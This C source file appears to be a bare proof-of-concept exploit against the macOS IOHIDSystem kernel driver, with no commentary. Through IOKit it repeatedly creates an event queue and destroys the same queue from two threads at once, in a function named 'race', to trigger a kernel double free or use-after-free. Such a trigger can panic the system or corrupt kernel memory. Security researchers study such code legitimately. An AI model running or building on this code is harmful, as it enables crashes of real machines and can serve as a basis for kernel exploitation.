#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include <IOKit/IOKitLib.h>
#include <pthread.h>

io_connect_t conn = MACH_PORT_NULL;

uint32_t callCreate(io_connect_t conn) {
    kern_return_t err;
    uint64_t inputScalar[16];  
    uint64_t inputScalarCnt = 2;

    inputScalar[0] = 0;
    inputScalar[1] = 32;

    char inputStruct[4096];
    size_t inputStructCnt = 0;

    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 1;

    char outputStruct[4096];
    size_t outputStructCnt = 0;

    err = IOConnectCallMethod(
      conn,
      0,
      inputScalar,
      inputScalarCnt,
      inputStruct,
      inputStructCnt,
      outputScalar,
      &outputScalarCnt,
      outputStruct,
      &outputStructCnt);
    if (err != KERN_SUCCESS){
      printf("unable to createEventQueue 0x%x\n", err);
    }

    return outputScalar[0];
}

void callDestroy(io_connect_t conn, uint32_t queueID) {
    kern_return_t err;
    uint64_t inputScalar[16];  
    uint64_t inputScalarCnt = 2;

    inputScalar[0] = 0;
    inputScalar[1] = queueID;

    char inputStruct[4096];
    size_t inputStructCnt = 0;

    uint64_t outputScalar[16];
    uint32_t outputScalarCnt = 0;

    char outputStruct[4096];
    size_t outputStructCnt = 0;

    err = IOConnectCallMethod(
      conn,
      1,
      inputScalar,
      inputScalarCnt,
      inputStruct,
      inputStructCnt,
      outputScalar,
      &outputScalarCnt,
      outputStruct,
      &outputStructCnt);
    if (err != KERN_SUCCESS){
      printf("unable to destroyEventQueue 0x%x\n", err);
    }
}

void race(uint32_t queueID) {
    callDestroy(conn, queueID);
}

int main(int argc, char const *argv[])
{
    kern_return_t err;

    CFMutableDictionaryRef matching = IOServiceMatching("IOHIDSystem");
    if(!matching){
      printf("unable to create service matching dictionary\n");
      return 0;
    }

    io_iterator_t iterator;
    err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
    if (err != KERN_SUCCESS){
      printf("no matches\n");
      return 0;
    }

    io_service_t service = IOIteratorNext(iterator);

    if (service == IO_OBJECT_NULL){
      printf("unable to find service\n");
      return 0;
    }
    printf("got service: %x\n", service);

    err = IOServiceOpen(service, mach_task_self(), 3, &conn);
    if (err != KERN_SUCCESS){
      printf("unable to get user client connection\n");
      return 0;
    }
    
    printf("got userclient connection: %x\n", conn);

    while(1) {
        uint32_t queueID = callCreate(conn);

        pthread_t t;
        pthread_create(&t, NULL, (void *(*)(void *)) race, (void*) (uint32_t)queueID);

        callDestroy(conn, queueID);

        pthread_join(t, NULL);
    }

    return 0;
}